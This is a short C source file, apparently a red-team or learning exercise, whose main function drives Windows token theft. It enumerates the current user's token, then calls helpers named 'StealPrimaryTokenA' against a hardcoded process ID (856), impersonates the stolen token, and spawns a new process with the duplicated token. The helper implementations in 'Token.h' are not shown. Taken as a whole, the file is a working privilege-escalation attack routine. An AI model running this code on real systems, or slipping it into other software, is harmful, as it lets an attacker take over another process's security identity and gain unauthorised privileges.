#include "Token.h"

int main()
{

	HANDLE hToken = NULL;
	HANDLE DuplicateHandle = NULL;
	HANDLE TargetProcessToken = NULL;
	DWORD PID = 0;

	if (!GetCurrentUserToken(&hToken))
	{
		PRINT_ERROR("GetCurrentUserToken");
		return 1;
	}

	if (!EnumerateUserTokenA(hToken))
	{
		PRINT_ERROR("EnumerateUserTokenA");
		return 1;
	}

	CloseHandle(hToken);

	if (!GetCurrentUserToken(&hToken))
	{
		PRINT_ERROR("GetCurrentUserToken");
		return 1;
	}

	PID = 856;
	if (!StealPrimaryTokenA(hToken, PID, &TargetProcessToken))
	{
		PRINT_ERROR("StealPrimaryTokenA");
		return FALSE;
	}

	if (!ImpersonateTokenA(TargetProcessToken))
	{
		PRINT_ERROR("ImpersonateTokenA");
		return FALSE;
	}

	CloseHandle(TargetProcessToken);

	if (!GetCurrentUserToken(&hToken))
	{
		PRINT_ERROR("GetCurrentUserToken");
		return 1;
	}

	if (!StealPrimaryTokenA(hToken, PID, &TargetProcessToken))
	{
		PRINT_ERROR("StealPrimaryTokenA");
		return FALSE;
	}

	if (!SpawnProcessWithDuplicateTokenA(TargetProcessToken, DuplicateHandle))
	{
		PRINT_ERROR("SpawnProcessWithDuplicateTokenA");
		return FALSE;
	}

	CHAR("Quit...");
	getchar();


	return 0;

}